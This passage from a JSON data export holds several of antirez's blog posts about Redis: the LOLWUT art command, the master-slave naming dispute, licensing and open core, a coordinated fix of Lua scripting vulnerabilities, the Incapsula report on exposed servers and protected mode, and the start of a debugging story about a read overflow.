skills will assist you writing emails, documentation, design documents, blog posts, and commit messages.  I write code because I have an urgent sense to share and communicate more than anything else. Comments coadiuvate the code, assist it, describe our efforts, and after all I love writing them as much as I love writing code itself.  (Thanks to Michel Martens for giving feedbacks during the writing of this blog post) Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-10-06T20:08:58Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8996.4906967, "slug": "writing-system-software-code-comments-16", "topics": []}}, {"model": "app.post", "pk": 17, "fields": {"title": "LOLWUT: a piece of art inside a database command", "link": "http://antirez.com/news/123", "source": 1, "normalized_link": "antirez.com/news/123", "summary": "The last few days have been quite intense. One of the arguments, about the dispute related to replacing or not the words used in Redis replication with different ones, was the following: is it worthwhile to do work that does not produce any technological result?  As I was changing the Redis source code to get rid of a specific word where possible, I started to think that whatever my idea was about the work I was doing, I\u2019m the kind of person that enjoys writing code that has no measurable technological effects. Replacing words is just annoying, even if, even there, there were a few worthwhile technological challenges. But there is some other kind of code that I believe has a quality called \u201chack value\u201d. It may not solve any technological problem, yet it\u2019s worth to write. Sometimes because the process of writing the code is, itself, rewarding. Other times because very technically advanced ideas are used to solve a not useful problem. Sometimes code is just written for artistic reasons.  In some way the Twitter discussion of the last days, mostly uninformed, chaotic, heated, made me think that, at this point, we are very far from the first hackers in the 60s. As I get older I find that it is harder and harder to talk about technology with an hacking perspective, where there are no walls or pre-cooked ideas, and the limit is the exploration. For everything you say there is a best practice. For every idea there is a taboo. To this new setup I say LOLWUT, since I don\u2019t feel represented by it, nor it represents hacking, at least in my vision. So the idea was to spend some technologically useless time in order to explore something of the 60s.  My attention went immediately to one of the computer art pieces I love the most: Schotter, by Georg Nees (https://en.wikipedia.org/wiki/Georg_Nees). With the help of a plotter and ALGOL programs, Nees explored writing programs to generate art using caos (randomness) and repeating patterns. Schotter is remarkable because of the simplicity of the piece and the deep meaning that the observer can find looking at it. Under a surface of total calm and order, deep inside the disorder hides. Or, if you put it upside down it becomes like the sea during a tempest. However the surface may look impetuous, the deep sea remains calm.  Is it possible to turn a piece of art into a database command? This was challenging because Redis is mostly used by a command line interface. Nowadays terminals are for sure fancier than the ones of the past, but yet to display decent graphics is hard. On the other side there is the huge advantage of the real time computation: a piece of art can be dynamic, changing every time it is generated.  Before continuing, I want to show you the final result:  img://antirez.com/misc/lolwut1.png  While very low resolution the idea of the original piece is still there. To make this possible I used a trick that recently was used by multiple programs trying to display interesting things in a text console. It involves using the Braille unicode charset in order to create a pixel matrix which is more dense than the individual characters of the console. Specifically, for each character, it is possible to fit a 2x8 grid of pixels.  The second part of the experiment was to make the art piece parametric:  img://antirez.com/misc/lolwut2.png  It is possible to generate different versions of the original piece, changing the number of squares and the output resolution. Finally the source code wanted to be an example of literate programming, being written in a form that resembles more a tutorial describing what everything does and why, instead of some opaque generator. You can find the code here:  https://github.com/antirez/redis/blob/unstable/src/lolwut.c  LOLWUT is also going to be a tradition starting from Redis 5. At each new major version of Redis what the command does will change completely, only a set of rules will be fixed:  1. It can\u2019t do anything technologically useful. 2. It should be fast at doing what it does, so that it is safe to call LOLWUT on production instances. 3. The output should be entertaining in some way.  I wrote the first one for Redis 5, for the next versions, if I find interest, I\u2019ll ask somebody else that contributed to Redis to write the other LOLWUT versions, otherwise I\u2019ll write it again myself (but I hope that\u2019s not the case). LOLWUT should remember ourselves that the work we do, programming, did not start just in order to produce something useful. Initially it was mainly a matter of exploring possibilities. I hope that LOLWUT also will remind the Redis community that computers are about humans, and that it is not possible to reason in an aseptic way just thinking at the technological implications. There are people using systems, people building systems, and so forth. Comments", "content": "", "cover_photo_url": "http://antirez.com/misc/lolwut2.png", "profile": 4, "updated_on": "2018-09-12T15:20:28Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8950.02603, "slug": "lolwut-a-piece-of-art-inside-a-database-command-17", "topics": []}}, {"model": "app.post", "pk": 18, "fields": {"title": "On Redis master-slave terminology", "link": "http://antirez.com/news/122", "source": 1, "normalized_link": "antirez.com/news/122", "summary": "Today it happened again. A developer, that we\u2019ll call Mark to avoid exposing his real name, read the Redis 5.0 RC5 change log, and was disappointed to see that Redis still uses the \u201cmaster\u201d and \u201cslave\u201d terminology in order to identify different roles in Redis replication.  I said that I was sorry he was disappointed about that, but at the same time, I don\u2019t believe that terminology out of context is offensive, so if I use master-slave in the context of databases, and I\u2019m not referring in any way to slavery. I originally copied the terms from MySQL, and now they are the way we call things in Redis, and since I do not believe in this battle (I\u2019ll tell you later why), to change the documentation, deprecate the API and add a new one, change the INFO fields, just to make a subset of people that care about those things more happy, do not make sense to me.  After it was clear that I was not interested in his argument, Mark accused me of being fascist. Now I\u2019m Italian, and incidentally my grand grand father was put in jail for years by fascists because he was communist and was against the regime. He was released to die in a couple of months at home. The father of my mother instead went in the north of Italy for II World War, and was able to escape from the Nazis for a miracle. Stayed 5 years as a refugee, and eventually returned home to become the father of my mother. Mark do not care about the terminology he uses against other people, if the matter at hand is to make sure people that may potentially feel offended will not.  Now, it\u2019s time for you to know my political orientation, so that you can put in context my refuse to change terminology. I want my government to be more open to immigration, including economical immigration, I do not accept any racism and I was strongly in favor of \u201cius soli\u201d law here in Italy. I do not just accept conceptually same-sex marriage, but I really love the beauty that there is in two men or women kissing, making sex, adopting a child. Every day in Facebook and with my social sphere I actively talk about politics in order to push equality. I believe in a systematic bias that our society perpetuates against women, and I\u2019m proud to live in a  country where women are free to not recognize the child as their own after giving birth, in order to have the same rights of the biological father that can go away: this was a big win of the European feminist movement in the 70s, together with the abortion right. I\u2019m proud that in my country there is no death penalty like there is not in the rest of EU, that guns are mostly banned, that there is universal healthcare for free.  I do not believe to be fascist or racist honestly, and I write almost daily about all this things on Facebook with my friends, talk at people on the street, and so forth. For years and years, since I was 16. So, what\u2019s the problem with changing this terminology?  The first problem is that every terminology is offensive in principle, and I don\u2019t want to accept this idea that certain words that are problematic, especially for Americans to make peace with their past, should be banned. For example if I\u2019m terminally ill, the \u201cshort living request\u201d terminology may be offensive, it reminds me that I\u2019m going to die, or that my father is going to die. Instead of banning every word out there, we should make the mental effort to do better than the political correctness movement that stops at the surface. So, let\u2019s call it master-slave, and instead make a call for US, where a sizable black population is very poor, to have free healthcare, to have cops that are less biased against non-white people, to stop death penalty. This makes really a difference. For instance Europeans that are a lot less sensible to political correctness, managed to do a much better job on that stuff.  There is more: I believe that political correctness has a puritan root. As such it focuses on formalities, but actually it has a real root of prejudice against others. For instance Mark bullied me because I was not complying with his ideas, showing problems at accepting differences in the way people think. I believe that this environment is making it impossible to have important conversations. For instance nobody at this point want to talk about women in tech and about the systematic bias of women in our society (to the point that recently in Japan it was discovered that women were systematically stopped from entering the best medical schools). People will go away once the discussion starts, because everybody knows that at this point to talk about this matters is a huge PR error, can cost you your job or company. Many, while reading this blog post, are thinking that I\u2019m crazy at writing this stuff, even if they think likewise. Well, I don\u2019t want that the people that did this to the our ability to have conversations will get a free pass to say what to do to others, because conversations is the only way we can make people that yet don't have an open vision to change ideas.  Moreover I don't believe in the right to be offended, because it's a subjective thing. Different groups may feel offended by different things. To save the right of not being offended it becomes basically impossible to say or do anything in the long run. Is this the evolution of our society? A few days ago on Hacker News I discovered I can no longer say \"fake news\" for instance.  I want a world of equity, opportunities, redistribution of wealth, and open borders. But the way I believe this world can be obtained is not by banning words, nor by stalking people on Twitter so that they comply with your ideology. I\u2019ll continue my local political activity, and I\u2019ll continue to write open source software. I hope that Mark, and the others like Mark, will let me live my life as I decided to do. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-09-06T21:04:56Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8938.9653189, "slug": "on-redis-master-slave-terminology-18", "topics": []}}, {"model": "app.post", "pk": 19, "fields": {"title": "Redis is not \"open core\"", "link": "http://antirez.com/news/121", "source": 1, "normalized_link": "antirez.com/news/121", "summary": "Human beings have a strong tendency to put new facts into pre-existing categories. This is useful to mentally and culturally classify similar events under the same logical umbrella, so when two days ago I clarified that the Redis core was still released under the vanilla BSD license, and only certain Redis modules developed by Redis Labs were going to change license, from AGPL to a different non open source license, people said \u201cAh! Ok you are going open core\u201d.  The simplification this time does not work if it is in your interest to capture the truth of what is happening here. An open core technology requires two things. One is that the system is modular, and the other is that parts of such system are made proprietary in order to create a product around an otherwise free software. For example providing a single node of a database into the open source, and then having the clustering logic and mechanism implemented in a different non-free layer, is an open core technology. Similarly is open core if I write a relational database with a modular storage system, but the only storage that is able to provide strong guarantees is non free. In an open core business model around an open source system it is *fundamental* that you take something useful out of the free software part.  Now for some time Redis is a modular system. You can use Redis modules in order to write many things, including new distributed systems using the recently introduced cluster message bus API, or new data types that look native. However the reason to make Redis modular was not to remove something useful from the system and put a price tag on it. For instance one of the new data structures in Redis 5, the streams, are part of the core and are released under the BSD license. Streams were implemented when Redis was already a modular system.  Redis modules started from a different observation. As a premise I should say that I\u2019m a very conservative person about software development. I believe that Redis should be focused to address just things that, when operated with in-memory data structures, offer strong advantages over other ways to do the same thing. I don\u2019t want Redis to do much more than it does, or to employ every possible consistency tradeoff. I want Redis to be Redis, that is, this general tool that the developer can use in different ways to solve certain problems.  However at Redis Labs we observed multiple times that it\u2019s a bit a shame that Redis cannot solve certain specific problems. For instance what about if Redis was a serious full text search engine? Also well, developers want so much JSON, what about having an API to talk directly JSON? And given that in-memory graphs if represented wisely can be so fast, what about having graph database abilities, with a rich query language? Redis Labs customers often asked directly for such things. And actually, such features could be cool, but it\u2019s not Redis, I\u2019m not interested, and the open source side of Redis does not have the development force to keep all this things going btw. And this is a major advantage both for Redis and for Redis Labs: it is relatively cheap to pay just me and a few more OSS development time internally, while allocating the rest of the resources to development of things that are useful for the Redis Labs business, like making sure the Redis enterprise SaaS and products are good. There is anyway a great deal of contributions arriving from the community. And I also keep saying \u201cno\u201d to all this fancy ideas that would keep Redis in other areas\u2026 which is also a problem.  Still to have such things similar to Redis but outside the Redis scope, would be cool, because you know, while it\u2019s not Redis mission, people may very well use a fast inverted index with full text search capabilities that you can feed in real time, while it serves a very good amount of queries per core at the same time. This is what Redis Labs is doing, it\u2019s using the same Redis technology and approach to do more than what Redis wanted to do. Not just in the functionality areas, but also in other areas like consistency models. I\u2019m very opinionated about certain things, and I think that, for instance, CRDTs while super cool in certain use cases, where not the right thing for Redis, to retain the same memory footprint, performance, simplicity, even at the cost of having a weaker consistency model. So Redis Labs, together with a top researcher in the area, did it (and this is a proprietary product without any source available). I can see how such feature can be tremendously useful for certain operations, but Redis was not there to solve everything, and Redis Labs did it.  This is not open core. Redis Labs is doing things that you would never see from me: for bandwidth, and because I believe that not all the softwares must eventually become huge.  So I think that calling this model \u201copen core\u201d is misleading, nothing is removed from the Redis table, just new things are explored, while trying to follow the \u201cRedis way\u201d in other areas otherwise not touched by the Redis project. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-08-24T22:38:52Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8914.1305633, "slug": "redis-is-not-open-core-19", "topics": []}}, {"model": "app.post", "pk": 20, "fields": {"title": "Redis will remain BSD licensed", "link": "http://antirez.com/news/120", "source": 1, "normalized_link": "antirez.com/news/120", "summary": "Today a page about the new Common Clause license in the Redis Labs web site was interpreted as if Redis itself switched license. This is not the case, Redis is, and will remain, BSD licensed. However in the era of [edit] uncontrollable spreading of information, my attempts to provide the correct information failed, and I\u2019m still seeing everywhere \u201cRedis is no longer open source\u201d. The reality is that Redis remains BSD, and actually Redis Labs did the right thing supporting my effort to keep the Redis core open as usually.  What is happening instead is that certain Redis modules, developed inside Redis Labs, are now released under the Common Clause (using Apache license as a base license). This means that basically certain enterprise add-ons, instead of being completely closed source as they could be, will be available with a more permissive license.  I think that Redis Labs Common Clause page did not provide a clear and complete information, but software companies often make communication errors, it happens. To me however, it looks more important that while running a system software business in the \u201ccloud era\u201d (LOL) is very challenging using an open source license, yet Redis Labs totally understood and supported the idea that the Redis core is an open source project, in the *most permissive license ever*, that is, BSD, and during the years provided a lot of funding to the project.  The reason why certain modules developed internally at Redis Labs are switching license, is because they are added value that Redis Labs wants to be able to provide only to end users that are willing to compile and install the system themselves, or to the Redis Labs customers using their services. But it\u2019s not ok to give away that value to everybody willing to resell it. An example of such module is RediSearch: it was AGPL and is now going to be Apache + Common Clause.  About myself, I\u2019ll keep writing BSD code for Redis. For Redis modules I\u2019ll develop, such as Disque, I\u2019ll pick AGPL instead, for similar reasons: we live in a \u201cCloud-poly\u201d, so it\u2019s a good idea to go forward with licenses that will force other SaaS companies to redistribute back their improvements. However this does not apply to Redis itself. Redis at this point is a 10 years collective effort, the base for many other things that we can do together, and this base must be as available as possible, that is, BSD licensed.  We at Redis Labs are sorry for the confusion generated by the Common Clause page, and my colleagues are working to fix the page with better wording. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-08-22T13:45:52Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8909.5798967, "slug": "redis-will-remain-bsd-licensed-20", "topics": []}}, {"model": "app.post", "pk": 21, "fields": {"title": "Redis Lua scripting: several security vulnerabilities fixed", "link": "http://antirez.com/news/119", "source": 1, "normalized_link": "antirez.com/news/119", "summary": "A bit more than one month ago I received an email from the Apple Information Security team. During an auditing the Apple team found a security issue in the Redis Lua subsystem, specifically in the cmsgpack library. The library is not part of Lua itself, it is an implementation of MessagePack I wrote myself. In the course of merging a pull request improving the feature set, a security issue was added. Later the same team found a new issue in the Lua struct library, again such library was not part of Lua itself, at least in the release of Lua we use: we just embedded the source code inside our Lua implementation in order to provide some functionality to the Lua interpreter that is available to Redis users. Then I found another issue in the same struct package, and later the Alibaba team found many other issues in cmsgpack and other code paths using the Lua API. In a short amount of time I was sitting on a pile of Lua related vulnerabilities.  Those vulnerabilities are mostly relevant in the specific case of providing managed Redis severs on the cloud, because it is very unlikely that the vulnerabilities discovered can be used without direct access to the Redis server: many Redis users don\u2019t use the cmsgpack or the struct package at all, and who does will very unlikely feed them with untrusted input. However for cloud providers things are different: they have Redis instances, sometimes in multi tenancy setups, exposed to the user that subscribed for the service. She or he can send anything to such Redis instances, triggering the vulnerabilities, corrupting the memory, violating the Redis process, and potentially taking total control of the Redis process.  For instance this simple Python program can crash Redis using one of the cmsgpack vunlerabilities [1].  [1] https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a  However from the point of view of normal Redis users that control what is sent to their instances, the risk is limited to feeding untrusted data to a function like struct.unpack(), after selecting a particularly dangerous decoding format \u201cbc0\u201d in the format argument.  # Coordinating the advisory  Thanks to the cooperation and friendly communications between the Apple Information Security team, me, and the Redis cloud providers, I tried to coordinate the release of the vulnerability after contacting all the major Redis providers out there, so that they could patch their systems before the bug was published. I provided a single patch, so that the providers could easily apply it to their systems. Finally between yesterday and today I prepared new patch releases of Redis 3, 4 and 5, with the security fixes included. They are all already released if you are reading this blog post. Unfortunately I was not able to contact smaller or newer cloud providers. The effort to handle the communication with Redis Labs, Amazon, Alibaba, Microsoft, Google, Heroku, Open Redis and Redis Green was already massive, and the risk of leaks extending the information sharing with other subjects even higher (every company included many persons handling the process). I\u2019m sorry if you are a Redis provider finding about this vulnerability just today, I tried to do my best.  I want to say thank you to the Apple Information Security team and all the other providers for the hints and help about this issue.  # The problem with Lua  Honestly when the Redis Lua engine was designed, it was not conceived with this security model of the customer VS the cloud provider in mind. The assumption kinda was that you can trust who pokes with your Redis server. So in general the Lua libraries were not scrutinized for security. The feeling back then was, if you have access to Redis API, anyway you can do far worse.  However later things evolved, and cloud providers restricted the API of Redis to expose to their customers, so that it was possible to provide managed Redis instances. However while things like the CONFIG or DEBUG commands were denied, you can\u2019t really avoid exposing EVAL and EVALSHA. The Redis Lua scripting is one of the top used features in our community.  So gradually, without me really noticing, the Lua libraries became also an attack vector in a security model that should instead be handled by Redis, because of the changing system in the way Redis is exposed and provided to the final user. As I said, in this model more than the Redis user, is the managed Redis \u201ccloud\u201d provider to be affected, but regardless it is a problem that must be handled.  What we can do in order to improve the current state of cloud providers security, regarding the specific problem with Lua scripting? I identified a few things that I want to do in the next months.  1. Lua stack protection. It looks like Lua can be compiled, with some speed penalty, in a way that ensures that it is not possible to misuse the Lua stack API. To be fair, I think that the assumptions Lua makes about the stack are a bit too trivial, with the Lua library developer having to constantly check if there is enough space on the stack to push a new value. Other languages at the same level of abstraction have C APIs that don\u2019t have this problem. So I\u2019ll try to understand if the slowdown of applying more safeguards in the Lua low level C API is acceptable, and in that case, implement it.  2. Security auditing and fuzz testing. Even if my time was limited I already performed some fuzz testing in the Lua struct library. I\u2019ll continue with an activity that will check for other bugs in this area. I\u2019m sure there are much more issues, and the fact that we found just a given set of bugs is only due to the fact that there was no more time to investigate the scripting subsystem. So this is an important activity that is going to be performed. Again at the end of the activity, I\u2019ll coordinate with the Redis vendors so that they could patch in time.  3. From the point of view of the Redis user, it is important that when some untrusted data is sent to the Lua engine, an HMAC is used in order to ensure that the data was not modified. For instance there is a popular pattern where the state of an user is stored in the user cookie itself, to be later decoded. Such data may later be used as input for Redis Lua functions. This is an example where an HMAC is absolutely needed in order to make sure that we read what we previously stored.  4. More Lua sandboxing. There should be plenty of literature and good practices about this topic. We already have some sandboxing implemented, but my feeling from my security days, is that sandboxing is ultimately always a mouse and cat game, and can never be executed in a perfect way. CPU / memory abuses for example may be too complex to track for the goals of Redis. However we should at least be sure that violations may result in a \u201cgraceful\u201d abort without any memory content violation issue.  5. Maybe it\u2019s time to upgrade the Lua engine? I\u2019m not sure if newer versions of Lua are more advanced from the point of view of security, however we have the huge problem that upgrading Lua will result in old script potentially no longer working. A very big issue for the Redis community, especially since, for the kind of scripts Redis users normally develop, a more advanced Lua version is only marginally useful.  # The issues  The problems fixed are listed in the following commits:  ce17f76b Security: fix redis-cli buffer overflow. e89086e0 Security: fix Lua struct package offset handling. 5ccb6f7a Security: more cmsgpack fixes by @soloestoy. 1eb08bcd Security: update Lua struct package for security. 52a00201 Security: fix Lua cmsgpack library stack overflow.  The first commit is unrelated to this effort, and is a redis-cli buffer overflow that can be exploited only passing a long host argument in the command line. The other issues are the problems that we found on cmsgpack and the struct package.  The two scripts to reproduce the issues are the following:  https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a  and  https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035  Both authored by the Apple Information Security team. However the first was modified by me in order to make it more reliably causing the crash.  # Versions affected  Basically every Redis with Lua scripting is affected.  The fixes are available as the following Github tags:  3.2.12 4.0.10 5.0-rc2  The stable release (4.0.10) is also available at http://download.redis.io as usually.  Releases tarball hashes are available here:  https://github.com/antirez/redis-hashes  Please note that the versions released also include different other bugfixes, so it\u2019s a good idea to also read the release notes to know what other things you are upgrading by switching to the new version.  I hope to be back with a blog post in the future with the report of the security auditing that is planned for the Lua scripting subsystem in Redis. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-06-13T17:15:05Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8775.4588522, "slug": "redis-lua-scripting-several-security-vulnerabilities-fixed-21", "topics": []}}, {"model": "app.post", "pk": 22, "fields": {"title": "Clarifications on the Incapsula Redis security report", "link": "http://antirez.com/news/118", "source": 1, "normalized_link": "antirez.com/news/118", "summary": "A few days ago I started my day with my Twitter feed full of articles saying something like: \u201c75% of Redis servers infected by malware\u201d. The obvious misquote referred to a research by Incapsula where they found that 75% of the Redis instances left open on the internet, without any protection, on a public IP address, are infected [1].  [1] https://www.incapsula.com/blog/report-75-of-open-redis-servers-are-infected.html  Many folks don\u2019t need any clarification about all this, because if you have some grip on computer security and how Redis works, you can contextualize all this without much efforts. However I\u2019m writing this blog post for two reasons. The obvious one is that it can help the press and other users that are not much into security and/or Redis to understand what\u2019s going on. The second is that the exposed Redis instances are a case study about safe defaults that should be interesting for the security circles.  The Incapsula report ===  Let\u2019s start with the Incapsula report. What they did was to analyze exposed Redis instances on the internet. Instances that everybody from any place of the internet can access, because they are listening for connections in a public IP address, without any password protecting them. It is like if they were HTTP servers, but it\u2019s Redis instead, that is not designed to be left exposed.  This is far from a new story. Because of Redis popularity the number of total Redis installations is pretty huge, and a fraction of these installations are left exposed. It\u2019s like that since the start basically. People spin a virtual machine in some cloud provider, install Redis, find that they cannot access it, open the port of the VM to anyone, and the instance is at this point running unprotected. They only thing that changed is that most of those instances in the past were left running unaffected in many cases. Maybe some script kiddie could connect and call \u201cINFO\u201d or a few more commands to check what there was inside, and that was it most of the times. Now the new crypto mining obsession is providing attackers a very good reason to break into other people\u2019s systems. Actually the best of the reasons: money. So the same exposed instances are now cracked in order to install some software to mine some kind of crypto currency. Incapsula checked the percentage of instances that look violated.  The way they collected the kind of attacks used against Redis instances was by running, on purpose, a set of exposed instances, to monitor how the attackers could target them. Many of the attacks look like variations on my own example attack [2].  [2] http://antirez.com/news/96  Also it is worth to note that to scan the IPv4 address space in order to find exposed instances of any kind of service is trivial. You could use, for instance, masscan. However you could do that 20 years ago using my own hping, and I remember doing this back then with success indeed.  TLDR: there are open Redis instances on the internet because they are misconfigured. Attackers profit from them by installing some kind of mining software, or for other reasons. But there is more\u2026 keep reading.  Protected mode ===========  Security is a terrible field in my opinion. I worked in such field, and decided to go away once it started to be no longer an underground affair. People are very opinionated about security issues, while, at the same time, there is little real care about, for instance, performing security auditings on real world systems (something that Google project zero is changing a bit, btw). So after receiving for the Nth time some PGP encrypted email saying that Redis was vulnerable to a temp file creation attack, I wrote the blog post at [2], just to tell: \u201cmaybe you are missing the point of Redis security\u201d. I basically published an attack against my own system that I could find in a few minutes of research, and that was very serious. The message was, again, Redis is not designed to be left exposed. And if you really want to play hack3rzzz look, there are more interesting things to do. However by doing that I put on the hands of script kiddies a great weapon to break into thousands of Redis instances open everywhere.  In order to pay back from my fault, in an attempt to atone my sin, I started to think about what I could do to make the situation simpler. One problem of Redis 3.x was that by default it would listen to all the IP addresses, so it was simple to misconfigure: just open the port, or have no firewalling at all, and the instance is exposed. The security mantra about that was \u201crun with safe defaults\u201d. That is, in the case of Redis, a networked cache, to have a default configuration that basically more or less does not work for most real world users out of the box. And what was worse, people that don\u2019t have a clue would just \u201cbind *\u201d to fix the problem, and we are back at the initial condition. So I tried to find something a bit smarter, a feature that I named \u201cprotected mode\u201d, with great disappointment of a group of 386 processors that manifested in front of my houses for days.  The idea of protected mode is to listen to every address, but if the connection is not local, the server replies with an error explaining *why* it is not working as expected, what to do, and the risks involved in just doing the silly thing of opening the instance to everybody by disabling protected mode. This is an example of how the feature works:  $ nc 192.168.1.194 6379 -DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command 'CONFIG SET protected-mode no' from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to 'no', and then restarting the server. 3) If you started the server manually just for testing, restart it with the '--protected-mode no' option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.  The advantage here is that:  1. The user knows what to do in order to fix this situation. It\u2019s much better than \u201cconnection refused\u201d.  2. We try to avoid that the user disables protected mode without understanding what is the risk involved, and that there are other solutions (setting a password or binding to certain interfaces).  Disillusion ========  So my illusion was that, maybe, it could be more helpful than the safe defaults. But unfortunately you can\u2019t fix the fact that a percentage of users just don\u2019t care, that some don\u2019t even know they are installing Redis, and that it\u2019s there just as a side effect of being a dependency for something else, or is installed by a script, or is included in the ABI image you are running and so forth.  Initially by grepping on Shodan it looked like Redis 4.0 protected mode was, actually, helping quite a lot! The open instances I could find replied \u201c-DENIED\u201d for the most part. That was great. However after the publication of [1] I asked Shodan (btw they rock and were super helpful on Twitter) if I could have the version breakdown of the exposed Redis instances. And the result is, there are still tons of Redis 4.0 instances exposed [3].  [3] https://asciinema.org/a/8heQvivQkFmUrisbb9FQLfMBj  It is true that they are less than the 3.0 instances, but they are still a lot. By investigating more I was even told that there are VM images where Redis protected mode is *removed* by the installation script by default, since sometimes people are annoyed by security features. They want things to just work over the network out of the box, so this is what they do, remove the annoyance. Then such image becomes popular, and many folks install it without knowing what\u2019s going on, and when Redis 4 is installed protected mode is off and the instance is exposed.  I think this is a lesson about safe defaults that can be trivially disabled by users. It looks like that in some way they could help, but just in reducing by some percentage the number of incidents, not to make them a rare exception.  What\u2019s next? =========  One of the fundamental problems in the Redis security model is that the server can be reconfigured via the normal API, using special commands like the CONFIG command. This is a very valuable feature of Redis, but it makes much simpler to break into the instance once you have access to the Redis API, and normal applications using Redis don\u2019t need this level of access.  So in the course of Redis 6, what will happen is that we\u2019ll introduce ACLs. Again, the way this feature will be introduced will try to be a \u201cno pain\u201d experience for existing users. If you connect without any credential, Redis will log in the client automatically using the \u201cdefault\u201d user, that can do everything applications normally do, but will deny all the administrative commands. Of course it will be possible to make it more strict by configuring things differently, create new users that can only call certain commands on keys matching a given pattern, and so forth.  In the course of Redis 6 we plan to also merge support for SSL connections, while this is unlikely to have any impact on the issue discussed here, because by default Redis will run unencrypted and the feature will be opt-in, however SSL is also one step forward for a more secure Redis experience in certain environments.  However my hopes are on ACLs, because it looks unlikely that the casual user will make the default account able to run the administrative commands. Especially because we plan to log connections originating from the local host as the \u201cadmin\u201d user directly. If this goes as I hope, we\u2019ll continue to see Redis 6 instances exposed, because it is inevitable, but at least those Redis 6 instances should make it harder to compromise the whole system. At least in theory: Redis EVAL command allows execution of Lua scripts, and such feature should be allowed by default since is a fundamental Redis feature. We try to have a kinda sandboxed Lua execution environment, but if you followed IT security for some time, you know that sandboxes are always imperfect, and more an exercise in finding how to escape them than a sealing solution. This time however I\u2019ll avoid publishing an attack just to make a point. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2018-06-02T17:52:39Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8754.3889411, "slug": "clarifications-on-the-incapsula-redis-security-report-22", "topics": []}}, {"model": "app.post", "pk": 23, "fields": {"title": "A short tale of a read overflow", "link": "http://antirez.com/news/117", "source": 1, "normalized_link": "antirez.com/news/117", "summary": "[This blog post is also experimentally available on Medium: https://medium.com/antirez/a-short-tale-of-a-read-overflow-b9210d339cff]  When a long running process crashes, it is pretty uncool. More so if the process happens to take a lot of state in memory. This is why I love web programming frameworks that are able, without major performance overhead, to create a new interpreter and a new state for each page view, and deallocate every resource used at the end of the page generation. It is an inherently more reliable programming paradigm, where memory leaks, descriptor leaks, and even random crashes from time to time do not constitute a serious issue. However system software like Redis is at the other side of the spectrum, a side populated by things that should never crash.  Months ago I received a crash report from my colleague Dvir Volk. He was developing his RediSearch Redis module, so it was not clear if the crash was due to a programming error inside the module, perhaps corrupting the heap, or a bug inside Redis. However it looked a lot like a real problem into the radix tree implementation:  === REDIS BUG REPORT START: Cut & paste starting from here === # Redis 999.999.999 crashed by signal: 11 # Crashed running the instuction at: 0x7fceb6eb5af5 # Accessing address: 0x7fce9c400000 | Backtrace: | redis-server *:7016 [cluster](raxRemoveChild+0xd3)[0x49af53] | redis-server *:7016 [cluster](raxRemove+0x34f)[0x49b34f | redis-server *:7016 [cluster](slotToKeyUpdateKey+0x1ad)[0x4415dd]  The radix tree is full of memmove() calls, and Redis crashed exactly trying to access a memory address that was oddly zero padded at the end: 0x7fce9c400000. My first thought was, I\u2019m sure I\u2019m doing some wrong memory movement here, and the address gets overwritten with zeroes, leading to the crash when the program attempts the deference the address.  I\u2019m pretty proud about my radix tree implementation. Not because of the implementation itself, while it\u2019s a complex data structure to implement, it\u2019s not rocket science. But because of the fuzz tester that comes with it and is able to cover the whole source code (trivial) and a lot of non trivial state (that\u2019s definitely more interesting). The fuzz tester does not do fuzzing just to reach a crash, it compares the implementation of the radix tree dictionary and iterator with a reference implementation that uses an hash table and qsort, to have exactly the same semantics, but in a short and easy to audit implementation. After receiving the crash report I improved the fuzz tester, ran it for days, with and without Valgrind, wrote additional data models, created tests using 100 millions of keys, but despite the efforts I could not reproduce the crash. A few days ago I would discover that there was no bug in the implementation I was testing, but at the time I was not aware of that. I could simply never find a bug that was not there. So after failing to reproduce I gave up.  One week ago I received two other additional bug reports that were almost the same. And again, the addresses were zero padded.  Dvir crash: Accessing address: 0x7fce9c400000 Issue 4605: Accessing address: 0x7f2959e00000 Issue 4642: Accessing address: 0x7f0e9b800000  It was time to read every memmove, memcpy, realloccall inside the source code, trying to figure out if there was something wrong that for some reason the fuzz tester was not able to catch. I found nothing, but then inspecting the Redis crash report I noticed something funny. During crashes Redis reports the memory mapped areas of the process, things like the following:  *** Preparing to test memory region 7f0e8c400000 (255852544 bytes)  Now, if you add 255852544to 0x7f0e8c400000, the result is 0x7f0e9b800000 , which is exactly the accessed address in the crash reported in issue 4642. So the program was not crashing because the memory address was corrupted, but because it was accessing an address immediately after the end of the heap. I checked the other issues, and the same was true in all the instances. Basically the end of the heap, at the edge of the start of unmapped addresses, was acting as a memory guard in order to detect and crash when an access was performed outside the bounds. This is a common technique that certain C memory sanitation tools used to employ in the past. Such tools would provide a drop in replacement formalloc() that would return addresses allocated at the edge of a non accessible memory page. Every overflow would be immediately detected in this way.  Because the program would crash only in that case, when deallocating a radix tree node at the end of the heap, it was simple to realize that the problem was a read overflow. You can never detect a read overflow otherwise: it will just access data outside your structure, but inside mapped 